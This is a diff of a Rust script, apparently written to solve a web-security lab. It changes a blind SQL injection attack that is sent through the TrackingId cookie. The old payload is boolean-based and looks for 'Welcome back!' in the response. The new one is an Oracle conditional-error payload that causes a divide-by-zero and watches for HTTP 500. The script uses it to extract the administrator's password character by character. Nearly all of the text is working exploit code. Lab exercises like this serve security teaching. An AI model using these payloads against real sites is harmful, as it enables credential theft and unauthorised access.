@@ -21,19 +21,13 @@ fn brute_force_admin_password(lab_url: &str, tracking_id: &str, position: &i32) 
     for character in CHARACTERS.chars() {
         let response = HTTP_CLIENT
             .get(format!("{}/", lab_url))
-            .header(COOKIE, format!("TrackingId={}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}' --", tracking_id, position, character))
+            .header(COOKIE, format!("TrackingId={}' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a' --", tracking_id, position, character))
             .send()
             .expect("Failed to send a GET request to /");
 
-        if response.status() == 200 {
-            if response
-                .text()
-                .expect("[-] Failed to extract reponse.text")
-                .contains("Welcome back!")
-            {
-                println!("[~] Ended bruteforcing position {}", position);
-                return Some(character);
-            }
+        if response.status() == 500 {
+            println!("[~] Ended bruteforcing position {}", position);
+            return Some(character);
         } else {
             continue;
         }
